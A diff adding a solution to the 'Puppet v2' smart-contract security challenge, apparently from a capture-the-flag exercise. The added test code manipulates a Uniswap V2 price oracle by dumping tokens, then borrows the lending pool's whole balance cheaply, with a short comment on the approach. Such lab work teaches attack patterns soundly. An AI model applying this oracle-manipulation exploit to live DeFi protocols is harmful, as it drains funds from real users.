@@ -83,6 +83,24 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).approve(uniswapRouter.address, POOL_INITIAL_TOKEN_BALANCE * 10n);
+        const path = [token.address, weth.address];
+        const timestamp = (await ethers.provider.getBlock()).timestamp;
+        await uniswapRouter.connect(player).swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 1n, path, player.address, timestamp * 2);
+
+        const depositRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).deposit({value: depositRequired});
+        await weth.connect(player).approve(lendingPool.address, depositRequired);
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        /*
+        Explanation:
+        Same thing as in the previous challenge.
+        We dump our DVT into the Uniswap pool.
+        We borrow cheap DVT.
+        This time done without a contract because there's no requirement on the number of transactions.
+        This challenge does not really add anything new, it's probably just to make sure you know how to use Uniswap V2. 
+        */
     });
 
     after(async function () {
